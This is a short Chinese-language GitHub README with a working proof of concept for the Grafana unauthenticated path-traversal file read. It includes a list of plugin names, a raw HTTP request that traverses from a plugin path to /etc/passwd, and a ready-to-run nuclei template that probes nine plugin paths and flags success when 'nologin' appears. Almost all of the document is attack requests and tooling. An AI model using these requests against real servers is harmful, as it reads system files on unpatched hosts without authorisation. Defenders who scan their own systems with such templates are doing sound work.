# Grafana-File-Read

## Grafana未授权文件读取
> 影响版本：8.0.0-lastest

<img width="711" alt="wecom-temp-e380dc0174f4d9f46e9e217a6e2c3ddb" src="https://user-images.githubusercontent.com/45926593/144997417-b4d7aaa1-d58d-4a5f-a22c-e8b9b7f16763.png">




整理公开插件(plugin-name)目录如下：

alexanderzobnin-zabbix-app<br>
grafana-worldmap-panel<br>
voxter-app<br>
grafana-clock-panel<br>
grafana-piechart-panel<br>
percona-percona-app<br>
grafana-azure-monitor-datasource<br>
grafana-x-ray-datasource<br>

poc:
/public/plugins/{plugin-name}/../../../../../../etc/passwd

```
GET /public/plugins/grafana-clock-panel/../../../../../../etc/passwd HTTP/1.1
Host: 127.0.0.1:3000
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:90.0) Gecko/20100101 Firefox/90.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

![image](https://user-images.githubusercontent.com/45926593/144997874-fe511f47-b6f7-4bf9-9a2b-2580c5b7888f.png)

依此写出nuclei的poc：
```
id: Grafana未授权文件读取

info:
  name: Grafana-File-read
  author: txf
  description: Grafana!
  reference:
    - https://github.com/tangxiaofeng7/Grafana-File-Read
  severity: critical
  tags: cve,cve2021,grafana
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.80

requests:
  - method: GET
    path:
      - "{{BaseURL}}/public/plugins/alexanderzobnin-zabbix-app/../../../../../../etc/passwd"
      - "{{BaseURL}}/public/plugins/grafana-worldmap-panel/../../../../../../etc/passwd"
      - "{{BaseURL}}/public/plugins/voxter-app/../../../../../../etc/passwd"
      - "{{BaseURL}}/public/plugins/grafana-clock-panel/../../../../../../etc/passwd"
      - "{{BaseURL}}/public/plugins/grafana-piechart-panel/../../../../../../etc/passwd"
      - "{{BaseURL}}/public/plugins/percona-percona-app/../../../../../../etc/passwd"
      - "{{BaseURL}}/public/plugins/grafana-azure-monitor-datasource/../../../../../../etc/passwd"
      - "{{BaseURL}}/public/plugins/grafana-x-ray-datasource/../../../../../../etc/passwd"
      - "{{BaseURL}}/public/plugins/grafana-simple-json-datasource/../../../../../../etc/passwd"

    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - 'nologin'
```

![image](https://user-images.githubusercontent.com/45926593/145003007-bb0255d2-61eb-4abc-b34a-b544184055eb.png)

